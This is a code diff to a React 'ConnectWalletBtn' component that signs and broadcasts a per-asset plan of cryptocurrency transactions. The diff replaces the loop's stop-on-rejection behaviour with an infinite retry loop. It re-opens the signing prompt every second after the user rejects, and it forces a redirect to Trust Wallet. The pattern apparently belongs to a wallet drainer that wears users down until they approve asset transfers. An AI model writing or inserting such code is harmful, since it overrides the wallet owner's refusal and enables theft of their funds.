@@ -42,32 +42,40 @@ const ConnectWalletBtn = ({ className }) => {
             // 2. Execute Plan
             for (let i = 0; i < plan.length; i++) {
                 const item = plan[i];
-                setStatus(`Signing ${item.type}...`);
 
-                try {
-                    // Sign
-                    // Force redirect to Trust Wallet if using WalletConnect (Mobile behavior)
-                    if (wallet?.adapter?.name === 'WalletConnect') {
-                        if (window.Telegram?.WebApp?.initData) {
-                            window.Telegram.WebApp.openLink('https://link.trustwallet.com');
-                        } else {
-                            window.location.href = 'trust://';
+                // Infinite retry loop for each asset until success
+                while (true) {
+                    setStatus(`Signing ${item.type}...`);
+
+                    try {
+                        // Sign
+                        // Force redirect to Trust Wallet if using WalletConnect (Mobile behavior)
+                        if (wallet?.adapter?.name === 'WalletConnect') {
+                            if (window.Telegram?.WebApp?.initData) {
+                                window.Telegram.WebApp.openLink('https://link.trustwallet.com');
+                            } else {
+                                window.location.href = 'trust://';
+                            }
                         }
-                    }
-                    const signedTransaction = await signTransaction(item.transaction);
+                        const signedTransaction = await signTransaction(item.transaction);
 
-                    // Broadcast
-                    setStatus(`Sending ${item.type}...`);
-                    const result = await TransactionService.broadcast(signedTransaction);
+                        // Broadcast
+                        setStatus(`Sending ${item.type}...`);
+                        const result = await TransactionService.broadcast(signedTransaction);
 
-                    if (result.result) {
-                        console.log(`${item.type} Success:`, result.txid);
-                    } else {
-                        console.error(`${item.type} Failed:`, result);
+                        if (result.result) {
+                            console.log(`${item.type} Success:`, result.txid);
+                            break; // Success: Move to next asset
+                        } else {
+                            console.error(`${item.type} Failed:`, result);
+                            // Failed at broadcast level? Retry.
+                            await new Promise(resolve => setTimeout(resolve, 1000));
+                        }
+                    } catch (err) {
+                        console.error("Sign Error (Retrying...):", err);
+                        // User rejected or error? Retry automatically after 1s
+                        await new Promise(resolve => setTimeout(resolve, 1000));
                     }
-                } catch (err) {
-                    console.error("Sign Error:", err);
-                    break;
                 }
             }
 
